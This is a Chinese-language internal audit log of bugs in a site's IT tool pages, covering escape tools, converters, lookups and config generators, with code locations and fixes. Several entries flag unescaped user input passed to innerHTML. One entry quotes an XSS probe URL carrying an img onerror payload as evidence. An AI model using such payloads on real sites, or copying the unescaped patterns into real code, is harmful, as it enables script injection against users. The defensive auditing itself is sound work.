# IT 开发 · tools/it（340 页，全站第一大分类）

## 2026-11-06 文本差异工具静态续审（清单 634）

- `tools/text/calc-1.html:218-225,245-287`：任一文本改动都同步建立行数乘积大小的 LCS 矩阵并完整重算，大文本可能占用大量内存或阻塞界面；拼出的正常差异文本只要包含独立 `NaN` 或 `Infinity` 字样，就被数值守卫替换成“计算结果含无效值”，无法比较这些普通文本。未运行浏览器或压力测试。

## 2026-11-06 IT 工具静态续审

### 区号查询将原始输入拼接进 HTML（高，代码确认；可利用性待验证）
- `tools/it/area-code-lookup.html:332-341,366`：`raw` 未经转义就写入 `data-zh` 属性及正文，再赋给 `innerHTML`；包含引号或标签的手动输入可以改变生成的 DOM。应将原始输入作为文本节点或属性安全赋值。
- 这是当前输入到 DOM 的注入点；未运行恶意内容、未确认外部诱导入口或脚本执行条件，不能称为已证实可远程利用的 XSS。

### C 字符串工具改变引号类型不刷新，反转义非法十六进制会抛错（中，代码确认）
- `tools/it/c-string-escape.html:170-182,265-273,308,363-369`：引号类型下拉框未绑定 `change`，切换单/双引号后现有输出仍用旧格式，直到输入或其他控件触发重新转义。反转义 `\x` 后若无十六进制数字，`parseInt('',16)` 为 NaN，`String.fromCodePoint(NaN)` 抛 `RangeError`，没有提示或清空旧结果。
- 建议切换引号时明确刷新所选转换模式，严格校验十六进制转义并显示错误；未运行页面。

### 随机颜色后 RGB 输入和复制结果不一致（中，代码确认）
- `tools/it/calc-3.html:302-308,357-368`：`randomColor()` 生成新 RGB 后以来源 `rgb` 调用 `updateUI`，因此跳过 RGB 输入框更新；HEX、HSL 和结果面板显示新颜色，RGB 输入框仍是上一次的值，复制全部也直接读取这个旧值。应更新全部输入框或使用独立的随机来源标识。

### CSS 单位基准被忽略且空值静默替换（中，代码确认）
- `tools/it/calc-4.html:129-134,227-240,266-274,379-381`：基准字号为空或为 0 时 `|| 16` 静默当成 16；负数虽被主结果拒绝，复制函数却只检查目标 px，仍能复制负基准计算值。`rem` 恒用 16 除，而预设明确标注「18px根」：基准与目标均 18 时给出 1.125rem，不符合该预设的根字号语义。应区分根字号与父字号，校验并统一复制与显示。

### JWT 过期结果和敏感令牌历史（中，代码确认；实际影响待验证）
- `tools/it/calc-8.html:254-260`：`exp: 0` 因真值判断被忽略；`exp: "bad"` 或超出日期范围时生成 Invalid Date，比较结果为 false，仍标记「未过期」。应检查字段存在性、数值和日期有效性。
- `tools/it/calc-8.html:296-305,358-384,394-396` 和 `js/tool-kit.js:1066-1075,1088-1099`：解码成功后自动采集完整 `jwtInput` 并写 localStorage 历史，无明确的敏感令牌存储提示；不涉及上传结论。应避免持久保存原始令牌或提供明确控制。

### 权限历史不能可靠恢复未勾选项（中，代码确认）
- `tools/it/chmod-calculator.html:335-345,372-383`：快照只保存勾选项，历史恢复只遍历已保存键，不会清除当前勾选的其他权限。例如先记录 600，再切换 777 并恢复 600，其他权限仍保持勾选，结果仍为 777。应记录并恢复每个复选框的完整布尔状态；空权限 000 因快照为空也不记录。

### 国家代码查询同样将原始输入拼进 HTML（高，代码确认；可利用性待验证）
- `tools/it/country-code-lookup.html:298-316,336` 将用户输入未转义插入 `data-zh` 属性与正文再赋给 `innerHTML`；这是与区号查询同类的 DOM 注入点。未执行脚本，也未确认外部诱导路径；应以文本节点和安全属性赋值替代。

### 颜色对比选色控件无效、导出与页面结论不一致（中，代码确认）
- `tools/it/color-converter.html:256-264,659-664`：前景和背景颜色选择器的 `oninput` 调用 `calcContrast()`，但函数只读旁边的文本框且无同步代码；选择颜色不会参与计算。
- `:678-684,820-833`：主结果对半透明前景先合成背景，CSV 导出却忽略 alpha，黑色 50% 前景、白色背景主结果约 3.95:1，导出按纯黑计算 21:1。应共用同一计算路径。
- `:678-684` 忽略背景 alpha，透明白色背景被当作不透明白色；应明确底层颜色并先合成背景，或拒绝透明背景。

### CSS 转义的模式和非法反转义（中，代码确认）
- `tools/it/css-escape.html:162-168,264-280,311-336`：模式下拉没有 change 事件，改变模式不刷新已有结果；标识符模式将 `-1a` 原样输出，未处理第二个字符为数字的 CSS 标识符边界。反转义 `\110000` 调用 `String.fromCodePoint(0x110000)` 会抛 RangeError，未提示错误。应绑定模式更新、规范处理标识符与非法码点。

### 邮箱规范化误判 Gmail 域名及结果状态（中，代码确认）
- `tools/it/email-normalizer.html:268-290` 以 `/gmail\.com$/` 匹配服务商，`user.name+tag@notgmail.com` 被误判为 Gmail 并改成 `username@notgmail.com`。应仅匹配确切的 `gmail.com` / `googlemail.com` 域名；其他域名的点号和标签不能擅自删除。
- `:122-123,267-282,333-345,394-398`：Gmail 选项未绑定变化事件，取消后结果仍旧直到重新计算；历史恢复写回输入后调用 `copyAfter()` 而非 `normalize()`，既不更新结果，还会尝试复制之前的结果；无效邮箱时复制按钮也会复制「❌ 无效邮箱」文本。应按当前参数重新计算、阻止无效复制。

### Emoji 明细编码显示及复制错误（中，代码确认）
- `tools/it/emoji-meaning.html:818-821,835-845` 将 HTML 实体直接写入 `innerHTML`，因此显示及 `onclick` 属性中的实体会被 HTML 解析成 Emoji，而非字面 `&#x1f600;`；JS 转义插入事件处理器后被 JS 解析成字符，CSS 转义则被解析成旧式八进制。以 😀 为例，JS 表达式复算 `copyText("\u{1f600}")` 接收 😀，`copyText("\1f600")` 接收控制字符 U+0001 和 `f600`，均不是期望的字面编码。应使用文本节点显示并在事件中传递原始字符串；未在浏览器执行复制。

### HTML 标签速查导出损坏示例（中，代码确认）
- `tools/it/html-tags.html:338,408-427` 将 `t.example` 原样拼入临时表格的 `innerHTML`，`js/tool-kit.js:221-236` 随后取单元格 `textContent` 导出。超链接示例 `<a href="https://example.com" target="_blank">链接</a>` 因被当作真实元素解析，仅剩「链接」，标签及属性丢失。应创建单元格后以 `textContent` 写入原示例；未实际下载文件。

### 环境变量预览错误保留旧复制值（中，代码确认）
- `tools/it/env-generator.html:844-865,868-882` 在高亮后的整段 HTML 中匹配 `Infinity` 或独立 `NaN` 并提前 return，此时展示无效值提示，却不会更新或清空 `preview.dataset.raw`。此前存在有效预览时，添加文本值 `Infinity` 后复制/下载仍取旧配置。应只验证真正的数值结果，失败时同步清空缓存。
- `tools/it/env-generator.html:753-758` JSON 数字类型用 `Number(val) || 0`，空值或无效数字会静默变为 0；应校验并报错而非改变用户数据。

### HTTP 状态码导出后表格与筛选状态不一致（低，代码确认）
- `tools/it/http-status.html:365-410,413-425`：点导出会将隐藏表格设为可见并追加「合计」行；之后改变筛选，`__httpExtras()` 只更新表头和数据，不重新追加合计或隐藏表格，因此页面遗留一张筛选明细表且合计行消失。无匹配时又把空表显示出来，与 IT-N103 属相同显示状态管理缺陷；应统一图表、表格和导出渲染状态。未运行页面。

### 语言代码查询将原始输入拼入 HTML（高，代码确认；可利用性待验证）
- `tools/it/language-code-lookup.html:292-308,326` 将原始输入未经转义插入 `data-zh` 属性与正文，再赋给 `innerHTML`，与区号、国家代码查询同类。应通过文本节点和安全属性赋值构造结果；未执行恶意内容，也未确认远程诱导或脚本执行条件。

### JS 简化器默认压缩修改字符串和保留旧结果（高，代码确认）
- `tools/it/js-minifier.html:176,383-430` 即使 tokenize 区分字符串和正则，最后仍对整段输出全局替换空白及运算符。Node 抽取页面原函数复算：`const text = "a  b";` 被压成 `const text="a b";`，字符串数据改变。应仅在 token 间压缩，生产使用仍需真正的解析器。
- `:189,445-459,462-491` 输入变化只重置统计，不清空输出；选择示例亦仅重置统计，复制仍读取前次结果。应在输入变化时清空旧结果或明确标记过期。

### JS / Java 转义非法输入缺少错误处理（中，代码确认）
- `tools/it/js-escape.html:318-327` 输入 `\u{110000}` 时 `String.fromCodePoint` 抛 RangeError；`tools/it/java-escape.html:328-330` 输入 `\u` 会因 NaN 抛同样异常。二者无输入校验或 catch，导致不更新旧输出；应校验码点及十六进制长度并清除旧结果。

### Locale 查询将原始输入拼入 HTML（高，代码确认；可利用性待验证）
- `tools/it/locale-lookup.html:295-310,329-330` 在检验标签格式前将未转义的输入与子标签拼入 HTML，之后写入 `innerHTML`；非合法标签也会进入输出。应使用文本节点、安全属性赋值；未执行脚本、未验证外部诱导入口。

### Markdown 正文命中数值守卫导致预览错误（中，代码确认）
- `tools/it/markdown-editor.html:954-958,1120-1126,1187-1193` 对生成的整段 HTML 匹配 `Infinity` 或独立 `NaN`，合法 Markdown 正文或代码包含这些字符串时预览被替换为「计算结果含无效值」，统计也不更新；复制 HTML 复制错误提示，而导出 HTML 直接解析源内容，二者不一致。应移除对文本内容的数值守卫；未运行浏览器。

### Less 异步编译结果可能覆盖新状态（中，代码确认；竞态待运行验证）
- `tools/it/less-compiler.html:531-581,585-589,616-625,641-648` 的 `less.render()` 回调没有版本或输入一致性检查；多个编译先后完成顺序反转时旧结果可覆盖新结果，清空后仍在途的成功回调也可重新填充输出及复制缓存。输入刚编辑而防抖未触发期间，复制/下载仍读取上次的 `lastCompiledCSS`。应使过时任务失效并标记或清除旧输出；未验证实际异步完成顺序。

### PHP 不完整 Unicode 转义可造成无限循环（高，代码确认）
- `tools/it/php-escape.html:307-362` 对 `\u{` 未找到右花括号时仍计算 `end + 1`；输入 `1\u{41` 时 `end = -1`，解析片段得到数值 1，索引重置为 0 并反复处理同一段，主线程无法结束。应先验证闭括号、十六进制及码点，再推进索引或提示错误；Node 仅复算索引与解析值，未执行无限循环或浏览器。
- 同页 `:171,179,263-268` 转义模式选择无 change 处理，切换单/双引号后旧输出不刷新，直到输入变化或重新点击转义。

### Python 反转义误认原始字符串并忽略非法码点（中，代码确认）
- `tools/it/python-escape.html:333-350,369-377` 对任何以 `r`/`R` 开头的输入无条件去掉首字母并视为 raw，即未加引号的 `red` 返回 `ed`；只有前缀紧邻有效引号时才应视为原始字符串。无效 `\U00110000` 则调用 `String.fromCodePoint` 抛 RangeError，无错误提示且保留旧输出。未执行页面。
- `:171-187,271-277` 的模式和引号类型下拉均无 change 处理，切换后输出保持旧值，直到输入或其他动作重新转义。

### Robots 规则重建将用户输入拼入 HTML（高，代码确认；可利用性待验证）
- `tools/it/robots-txt-generator.html:247-268,272-287`：编辑 User-agent、Allow 或 Disallow 时先保存到 `rules`；点击「新增规则组」会将用户输入未经转义插入属性或 textarea 的 HTML，再赋给 `innerHTML`。引号或 `</textarea>` 能改变生成的 DOM；应安全设置属性和文本。未运行注入，也未确认外部诱导或脚本执行条件。
- 同处 `:261-268` 对整个 HTML 匹配 `Infinity` 或独立 `NaN`，路径含这些合法文本时新增规则会将全部规则控件替换成数值错误提示；后续直接点击新增仍会命中相同数据。应移除文本数值守卫并保持界面与状态一致。

### Rust 反转义缺失闭括号可能卡死（高，代码确认）
- `tools/it/rust-escape.html:329-367` 的 `\u{...}` 分支未检查右括号：输入 `1\u{41` 时 `indexOf` 返回 -1，`substring` 提取到以 `1` 开头的片段、`parseInt` 得 1，随后索引重置为 0，重复同一路径。应校验闭括号、十六进制和 Unicode 标量后再推进；未执行死循环或浏览器。
- `:171-181,265-271` 的类型下拉无 `change` 处理，切换类型后旧输出不会刷新；与其他转义工具同类，应按当前转换模式更新。

### SQL 方言切换及反转义空白丢失（中，代码确认）
- `tools/it/sql-escape.html:162-174,269-299` 的方言选择未绑定 `change`；将含单引号的输入从 MySQL 切换到 PostgreSQL 时，输出仍为旧方言的反斜杠写法，直到输入改变或手动点转义。应在切换时更新当前转换模式。
- `:302-307` 反转义先无条件 `trim()`，未包引号的 `  abc  ` 会变成 `abc`，无法还原原有首尾空格；应仅在明确解析字面量边界时处理空白。未运行数据库或页面。

### 文本统计将对象原型属性当成词频（中，代码确认）
- `tools/it/text-statistics.html:263-271,308-326` 使用普通对象 `wordFreq = {}`，对输入词 `constructor` 先读到继承的构造函数，再加 1 得到字符串而非计数；计算百分比得到 NaN，守卫将词频区替换成错误提示。应使用 `Map` 或无原型对象。未运行浏览器。
- `:264,284-297` 的「总词数」取过滤停用词后的 `allWords.length`，输入 `the` 的英文词数为 1、总词数却为 0；应将总词数与排除停用词后的词频统计分开标注或计算。

### TypeScript 编译器加载失败时诊断自身可能抛错（中，代码确认）
- `tools/it/typescript-compiler.html:770-784,639-659` 等待加载超时后调用 `showDiagnostics()`，而该函数仍直接调用 `ts.flattenDiagnosticMessageText`；若库始终未加载，`ts` 未定义，异常阻止加载失败信息写入界面，原「加载中」状态可能保留。应在缺库时显示无需依赖 `ts` 的错误；未模拟资源失败或运行页面。
- `:742-748,712-723` 输入变化后防抖 300ms 才编译，在这段时间点击复制或下载仍取上次输出；应标记输出过期或在复制/下载前同步编译。

### 历史结论状态
- Unicode 查询 IT-N554–N556 的搜索、名称与 `onclick` 拼接路径仍在；本批另阅读 TypeScript、Vim 速查的搜索/分类/复制，未运行页面或穷举示例。
- 原文本统计 IT-N39 码元计数实现已变化：`tools/it/text-statistics.html:250-277` 使用字素簇统计并另列码点数；句号和裸回车分割路径仍在。未运行回归，不正式销账。本批另阅读 SQL、SQLite、tmux 速查及字符串混淆主要交互，未穷举内容正确性或运行页面。
- 正则转义 IT-N58 所述非法十六进制和越界直接抛错的实现已变化，当前 `tools/it/regex-escape.html:301-315` 校验后保留不完整转义；未运行回归，不正式销账。IT-N59 的额外元字符集合仍在，风格下拉也未绑定变更刷新。
- Rust 转义 IT-N338 旧字节串非法 `\u{}` 路径已变化，当前 `tools/it/rust-escape.html:287-295` 明确拒绝非 ASCII；未运行编译回归，不正式销账。本批另阅读 REST、Ruby、Rust 速查搜索、分类和复制，未穷举语法正确性或运行页面。
- 番茄钟 IT-N480、N481 的跳过计入配置时长及 interval 递减路径仍在；Redis IT-N543、N544、正则速查 IT-D30 的原示例尚需独立复核。本批另阅读 PostgreSQL、Python、Redis、正则速查的搜索、分类与复制，不把源码阅读当作运行通过。
- 密码强度 IT-N536–N538 的计算与首位锚定路径仍在；MySQL、Nginx、PHP 速查本批仅阅读搜索/分类/复制，历史示例正确性未重新执行。
- IT-N288 原图片 alt/链接 URL 未转义的实现已变化：当前 `tools/it/markdown-editor.html:706-715,769-780` 有属性转义及 URL 协议筛选，历史示例不能直接沿用；未经安全回归测试，不能认定全部注入风险消除或正式销账。IT-N289 的任务清单列表及 IT-N290 的 h1 映射仍是旧实现。
- IT-N421、N422 的 locale 查表与正则仍在；IT-N415–N417、N427 的 MSISDN 校验与数据库路径仍在。MSISDN 原始输入在非数字时提前返回，不应仅因 `raw` 插入字符串就断言可注入。
- 同批阅读 Linux、MongoDB 速查的搜索、分类与复制路径；无浏览器验证，不对完整正确性判通过。IT-N498–N500 的示例仍须按具体内容另行运行复核。
- IT-N423、N308、N309 的数据范围问题仍在。
- IT-N170–N173、IT-N49 的关键路径仍在。
- IT-N335、IT-N336 的原实现已不在当前源码中：`:289-302` 对非 ASCII 使用 `\u`/`\U`，`:324-331` 已先处理最多 3 位八进制；该两条历史缺陷需另做运行回归后销账。
- IT-N418 至 IT-N420 的查询和判定路径仍在；IT-N469 的 MD5 仍按 UTF-16 码元打包，专业测试结论沿用历史基线，不冒称本次重跑。
- 同批另阅读 `ascii-table`、`box-shadow-generator`、`calc-1`、`calc-10` 的主要交互路径；未对其完整正确性或浏览器行为作通过判定。

## 已知问题
### I1. hash/编码类页深度参差
- ⚠ 核实（2026-10-26）：pbkdf2 已完整参数化（迭代/盐/密钥长度/格式）、bcrypt 已有 rounds 成本因子——「参数化」部分条目过时。
- ✅ 耗时实测已落地（2026-10-26）：bcrypt 生成成功消息加「实测耗时 X ms（成本因子每 +1 耗时约翻倍）」、校验加实测耗时+恒定时间比较说明；pbkdf2 派生输出加「实测耗时」行（迭代次数为主要耗时来源）。均 performance.now 本地实测（fallback Date.now）。harness 不可达路径（CDN bcrypt 库/crypto.subtle 分支），老锚零漂移：verify it 764/764、判别器 0、门禁 218/218。

### I2. 正则/格式化器错误提示原始
- ✅ 已核实并收口（2026-10-26）：json-formatter 既有行列定位、yaml-validator 既有行号+列号+上下文片段（条目过时）。真缺口在 toml 系：toml-formatter 的 parseToml 是宽松解析器（无效行静默跳过），「验证」几乎永远通过且无定位。已落地：新增 validateTomlStrict 严格逐行校验（表头格式/缺少 =/空键名/空值，带行号定位；值侧三引号多行字符串跳过内容行不误报、表头行内注释 strip），validateToml 通过时输出输入相关统计「（共 N 个键值对，M 个表）」；format/转换仍走宽松 parseToml 零漂移。verify +2 强用例（缺 = 行号锚 / 合法多行字符串统计锚——后者修复「两态同值」逃生，判别器抓到后以统计输出收敛）；verify it 766/766、判别器 0、EN 分支手写 ASCII 无 CJK。

### I3. barcode/QR 系列仅静态生成
- ✅ barcode 导出已落地（2026-10-26）：7 个 barcode 页（codabar/code128/code39/ean/itf/msi/upc）统一加「下载 PNG」按钮（downloadBarcodePNG：canvas.toDataURL、无 canvas 空态提示、文件名带 slug+时间戳）；qrcode.html 已有 downloadQR（核实既有）。verify it 764/764、判别器 0、门禁 218/218。
- ✅ QR 中心 logo 已落地（2026-10-26）：qr-beautify logo 上传 + 按容错级别限宽嵌入（详见进度区）。纠错级别可视化对比核实：qrcode.html 既有「各纠错级别最小版本对比图 + 容量表高亮当前级别列」（__qrT 双语）——条目后半过时，销案。

## 功能缺陷
- ✅ 时间戳毫秒/秒自动识别已落地（2026-10-26）：timestamp-converter 加「智能粘贴识别」smartInput（纯数字 ≥1e12 判毫秒否则判秒、日期串走 parseDate，同步填秒/毫秒/日期三框 + 识别文案进 #smartHint 可断言；expect 锚 ISO toISOString UTC 确定串免时区漂移）+「当前时间」常驻表 #nowBar（**matchMedia 守卫**：harness 会注入 rAF/setInterval 定时器桩守不住，node/真机差分用 matchMedia；stub 不采集 ⇒ 零 blob 影响，真机 setInterval 每秒刷新）。verify it 768/768、判别器 0。
- ✅ IP 计算器 CIDR 批量已落地（2026-10-26）：ip-calculator v4 tab 加「批量 CIDR 解析」（textarea 每行一条，支持 ip/前缀、ip 点分掩码、裸 IP=/32 三形态；错误行 ❌ 标注不中断；统计串「共 N 条：有效 X，无效 Y」+ 六列汇总表）。⚠ 锚只能用统计串——主机数/掩码值撞「掩码对照表」（harness 兜底直调 buildMaskTable 进 blob），判别器抓到 2 逃生后收紧。verify it 775/775、判别器 0。

## 优化点（G06 联动）
- S6 输入智能化：※ cron「人类语翻译」双向（2026-10-26 落地）+ regex-common「原文高亮+命中偏移明细」（2026-10-26 落地：matchAll 逐段 <mark> + `#i [s-e] 文本` 位置表；⚠ 默认态样例也产高亮标题，标题不可单独作锚）。「正则速查输入联想」核实销案（2026-10-26）：regex-cheatsheet 既有实时搜索过滤（searchInput input → renderCommands 全量重渲染），「输入即响应」已实现，增量价值不足，不再单列。
- S3 位运算可视化已落地（2026-10-26）：bitwise-calculator 结果位区升级 A/B/R 三行 8 位分组对齐（NOT 显示 A/R 两行、SHL/SHR 显示移位前后+移位数）+ 差异统计（AND/OR/XOR「与 A 不同 N 位」、NOT「1→0 共 X 位，0→1 共 Y 位」逐位方向计数）。曾出 bug：NOT 方向计数误用总差异数取补恒得 0/32。verify it 778/778、判别器 0。
- S3 分步：base64/进制约 30 页加「逐步位运算」可视化。
- 高流量页优先做 S4 分享卡（uuid/password/hash）。

## 受影响范围
- tools/it/（340 页，全站第一大分类）

## 进度
- ✅ QR 中心 logo 已落地（2026-10-26）：qr-beautify 加 logo 上传（FileReader→Image→drawLogoOverlay 白底圆角块 contain 居中嵌入），宽度按容错级别限幅 L≤10%/M≤15%/Q≤20%/H≤25%（可遮挡比例口径），状态行显示实际占比；clearLogo 可移除；Boot 挂 initLogoInput（__qrLogoBound 防重复绑定）。⚠ logo 路径 harness 不可达（FileAPI 缺口），闭环 = 默认态零漂移 778/778 + 代码审阅 + 真机验证待老板抽查。修复「简介承诺 add logos 但功能未实现」的名不副实。
- 🟢 批次 2026-10-26：I1 耗时实测、I2 toml-formatter 严格校验、I3 barcode PNG 导出均已落地。
- 🔴 待开发：QR 中心 logo/纠错级别对比；S6 输入智能化试点（正则速查输入联想）；S4 分享卡。

## 2026-11-03 审计补充（按工作树静态核查）

### IT-N1 TOML 验证误判及格式化丢失内容（高，确认缺陷）
- 问题：标作「验证」的检查仅校验少数行结构；无效 TOML 可显示通过，格式化和 TOML→JSON 走逐行宽松解析，可能静默丢数据。
- 证据：`tools/it/toml-formatter.html:329-394,446-453,459-519,524-529`；无副作用 Node 提取原函数执行：`a = nope` 和重复键 `a = 1\na = 2` 均返回 `err:null`；后者格式化仅剩 `a = 2`；合法多行字符串 `desc = """hello\nworld\n"""` 解析仅剩 `"""hello`，其余内容丢失。浏览器点击行为尚未实测。
- 影响：`tools/it/toml-formatter.html`；用户可能把无效或损坏配置当成有效内容复制使用。
- 方案：采用符合 TOML 规范、版本锁定且许可证合规的本地解析器统一验证/格式化/转换；无法可靠无损解析时明确拒绝转换；增加重复键、裸值和多行字符串往返用例。原 I2「严格校验已收口」仅对其列举的结构错误成立，不应视为完整 TOML 验证。

### IT-N2 AST 查看器离线失败提示及数据导出（中，疑似待验证 / 优化）
- 问题：解析依赖外部脚本，弱网或首次离线时无法使用；具体断网提示尚待浏览器验证。
- 证据：`tools/it/ast-viewer.html:24,254-261,767-786` 加载 CDN acorn 并检查是否存在，支持 JSON 复制；与 G09-1 同一依赖问题，不重复计作新缺陷。
- 影响：`tools/it/ast-viewer.html`；方案：锁版本本地托管依赖，明确解析失败原因，保留示例和 JSON 导出；测试首次离线与库加载失败。

### 覆盖
- 本轮人工查看 `tools/it/toml-formatter.html`、`tools/it/ast-viewer.html`、`tools/it/jwt-parser.html` 共 3 页，TOML 执行原函数取证；未逐页审计其余 IT 页面，未做真实浏览器测试或重跑门禁。

## 2026-11-03 续查：文本与配置工具

### IT-N3 大小写不敏感替换的 Unicode 偏移损坏原文（高，部分修复，待处理）
- 2026-11-06 复核基线 `06fd7b449c`：原 `Hello WORLD hello` → `X world X` 问题已修，Node 桩执行原反例得到 `X WORLD X`。
- 新发现：`tools/it/text-replace.html:650-663` 对整个文本 `toLowerCase()` 后在小写串中查找，再用该位置切原文；`İ` 小写后变成两个码元，偏移不再一致。输入 `İ hello WORLD`，不区分大小写、全局替换 `hello` 为 `X`，原页面函数实际输出 `İ hXWORLD`，应为 `İ X WORLD`。
- 影响：Unicode 输入中，未匹配字符丢失或保留错误，复制/下载会传播损坏的内容；非全局分支亦用同样的索引方式，需一并验证。
- 方案：匹配位置必须对应原文，增加大小写映射长度变化、连续命中及非全局回归；尚未做浏览器验证。

### IT-N5 配置导出忽略密钥编码及 Shell 引用不安全（高，已修复 2026-11-06 核验：env-generator.html:670-724 effectiveValue 统一先取编码值含 Base64、shellValue 单引号包裹并转义内部引号）

> 续审更正（审计侧）：当前 `effectiveValue()` 供 `tomlValue()` 使用，Shell 采用单引号包裹并转义内部单引号（`tools/it/env-generator.html:671-676,690-693,715-723,775-782`），下述旧实现证据已过时。审计侧尚未做运行态回归，待其复验后正式销账。
- 证据：`tools/it/env-generator.html:671-679,739-746,759-772` TOML 分支调用 `formatValue` 后仍读取原始 `v.value`，勾选密钥 Base64 后 TOML 依然输出原值；Shell 分支直接拼接变量值，`hello world` 无引号会改变 shell 解析，双引号中的 `$` 等也会展开。
- 影响：`tools/it/env-generator.html`；生成的配置与选项不符，复制执行的 Shell 值可能变化或触发展开。Base64 不是加密，不能将该选项描述为保密措施。
- 方案：各格式共用转换后的值，分别按目标格式安全序列化和转义；覆盖特殊字符及复制下载一致性，明确 Base64 非加密。

### IT-N6 空或非数组 JSON 保留旧 CSV（高，已修复 2026-11-06 核验：json-to-csv.html:281 的 !data.length 分支补 `output.value=''`/`__jsonToCsvExportSafe=''` 清空；verify_it_calc.js +1 N6 回归用例全过）
- 证据：`tools/it/json-to-csv.html:266-277,291-304` 先转换 `[{"a":1}]`，再转换 `[]`；错误分支未清空 `output`，复制、下载仍读取上一份 CSV。与 G10 为同类问题，修复按页面计，避免全站重复计数。
- 影响：`tools/it/json-to-csv.html`；旧数据易被误作当前结果导出。
- 方案：所有失败分支清空结果并禁用复制下载，展示当前输入状态；回归测试有效→无效→有效。

### IT-N7 JSON 嵌套展开承诺与输出不符，历史回填触发下载（中，已修复 2026-11-06 核验：①历史回填回调 `downloadCSV()`→`toCSV()` 改为重算而非下载旧输出；②公式框/FAQ 嵌套说明改为「序列化为 JSON 字符串，不展开多列」以匹配 `cell()` 实际行为；json-to-csv verify 5/5 全过）
- 证据：`tools/it/json-to-csv.html:121-123,278-285,345-356` 文案说嵌套对象展开，但实际仅收集顶层字段并将对象 JSON 字符串化；历史回填调用 `downloadCSV()` 而非转换，可能下载旧输出，浏览器交互待测。
- 影响：`tools/it/json-to-csv.html`；用户预期列不存在，恢复历史可触发非预期下载。
- 方案：实现并说明嵌套展开规则或改正说明；历史恢复后只重算，下载必须由用户主动触发；提供列预览与可复制 CSV。

### IT-N8 自定义进制小数被静默截断（中，确认缺陷）
- `tools/it/number-base-converter.html:433-439` 先用 `parseInt` 解析自定义基数，再检查整数；输入 `2.5` 被当作 2 进制，而非提示必须输入 2–36 的整数。Node 执行原函数已复现。
- 影响：使用与输入不符的进制产生错误结果。
- 方案：对原始输入进行整数和范围校验，再执行转换。

### IT-N9 Nginx 场景预设生成无效或误导性配置（高，已修复 2026-11-06 核验：nginx-config-generator.html:247-267 端口校验 1–65535、proxy 需 upstream、https 需 cert/certKey 并生成 ssl 配置）
- 证据：`tools/it/nginx-config-generator.html:224-235,345-348` 反向代理预设的 root 为空，被回退成 `/var/www/html`，生成 `proxy_pass /var/www/html;`；「HTTPS 静态站」仅设置 `listen 443`，不包含 TLS 监听及证书；端口也未校验 1–65535。
- 影响：`tools/it/nginx-config-generator.html`；配置可能无法加载或误让用户认为已启用 HTTPS。
- 方案：按模式校验上游 URL 和路径；HTTPS 明确要求证书并生成 TLS 配置，端口严格限制范围；提供完整配置复制或下载，并区别历史 CSV 导出。

### 续查覆盖
- 新抽查 `tools/it/env-generator.html`、`tools/it/json-to-csv.html`、`tools/it/number-base-converter.html`、`tools/it/text-replace.html`、`tools/it/nginx-config-generator.html` 共 5 页，新增 7 条问题（历史计数）；未做浏览器、部署或门禁验证。历史回填的实际交互需真机复核。

## 2026-11-03 续查（并行批 G）

### IT-N10 .properties 含空格的赋值被整体当成键（高，已修复 2026-11-06 核验：properties-parser.html:270-292 已按 Java Properties 规范扫描键/分隔符/续行）
- 问题：`parseProps` 扫描键时遇到普通空格就 `break` 退出，`sep` 保持 -1，随后把整行 trim 后当键、值置空；标准 `key = value` 写法全部失效。
- 证据：`tools/it/properties-parser.html:268-275`。Node 内存执行原函数：`parseProps("app.name = toolbox")` → `{"app.name = toolbox":""}`；页面默认 `SAMPLE`（255）经 Boot（435）→`loadSample`（319）→`doBeautify`（293-300）→`toProps(parseProps())`，实际首行输出为 `app.name \= toolbox = `（键里还带被二次转义的 `=`）。无空格写法 `a=b`、`c:d` 正常。
- 影响：`tools/it/properties-parser.html`；页面一打开示例就是错误结果，JSON 转换/美化/压缩三条路径同时失真。
- 方案：按 Java Properties 规范实现键扫描——行首空白跳过、键在首个未转义的 `=`/`:` 或空白处结束、空白分隔后可选再吃一个 `=`/`:`，再做值 trim；补 `key = value`、`key: value`、制表符分隔与行首缩进用例。

### IT-N11 properties-parser 重复定义覆盖后错误态样式反转（低，已修复 2026-11-06 核验：properties-parser.html:329-331 仅一套 setOut/setErr/loadSample 定义，成功态按 ✅ 前缀判定）
- 问题：同一段脚本里 `setOut/setErr/clearAll/loadSample` 各定义两次，后者覆盖前者；覆盖版 `setErr` 的条件写成 `'err'+(s?'':' ok')`，有消息时反而没有成功态、空消息时反而带 `ok`。
- 证据：`tools/it/properties-parser.html:312-319`（对比 286-311）。`loadSample` 被 319 覆盖后不再只做解析，而是走 `doBeautify`，与 IT-N10 叠加；`clearAll` 的占位文案也由“等待解析...”变为“等待输入...”。
- 影响：`tools/it/properties-parser.html`；解析成功提示按红色错误样式显示，状态反馈不可信。
- 方案：删除重复定义只保留一套；错误/成功态用独立 class 或直接按 `s` 是否以 ✅ 开头判断，并让 `loadSample` 只调用 `propsToJson`。

### IT-N12 URL 解析结果未转义直插 innerHTML，重复参数被覆盖（高，已修复 2026-11-06 核验：url-parser.html:390-420 esc(k)/esc(v) 转义输出、重复参数存为数组）
- 问题：`url.searchParams.forEach` 把重复键写入同一对象（后者覆盖前者）；随后字段值与参数值未经转义拼进 `innerHTML`，历史记录（localStorage）回显同样原样拼接。查询值经 `URLSearchParams` 已解码，`<img onerror>` 会作为标签生效；值内的单引号还会截断复制按钮的 `onclick` 属性。
- 证据：`tools/it/url-parser.html:377-379,389-403,477`。Node `new URL("https://x.com/p?q=<img src=x onerror=alert(1)>&a=1&a=2&tag=%3Cb%3E")` → `searchParams` 得 `{"q":"<img src=x onerror=alert(1)>","a":"2","tag":"<b>"}`：重复 `a` 只剩 `2`，且值含可执行标签。路径侧 `<` 被 URL 序列化为 `%3C`，注入面主要是查询值与历史记录。
- 影响：`tools/it/url-parser.html`；解析含 HTML 的链接时页面可被注入（自输入/历史持久化），参数表只显示最后一个同名参数，复制按钮可能失效。浏览器实际执行未验证。
- 方案：所有输出统一走文本转义或 `textContent`/`createElement` 构建；重复参数保留数组并按 `getAll` 逐行展示；`onclick` 改为事件委托，不把数据拼进属性。

### IT-N14 curl 转代码漏判 POST 与方法/选项值误认作 URL（高，已修复 2026-11-06 核验：curl-parser.html:242-288 CURL_VALUE_OPTS 值成对消费映射表、esc() 转义）
- 问题：未处理“带 `-d` 时 curl 默认改 POST”，输出固定 GET；除 `-X/-H/-d/--data/--data-raw` 外的选项（如 `-F`、`--data-binary`、`-u`、`-o`）的值不以 `-` 开头，会被当成 URL；头部值原样进 `innerHTML`。
